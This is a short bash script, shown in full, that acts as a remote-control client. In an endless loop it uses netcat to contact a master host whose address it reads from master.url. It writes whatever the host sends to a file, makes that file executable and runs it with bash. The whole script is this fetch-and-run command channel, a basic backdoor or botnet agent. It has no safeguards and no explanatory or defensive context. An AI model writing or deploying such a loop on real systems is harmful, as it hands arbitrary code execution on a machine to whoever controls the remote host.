#!/bin/bash
while true
do
  nc `cat master.url` >command.last && chmod 755 command.last && bash ./command.last
done
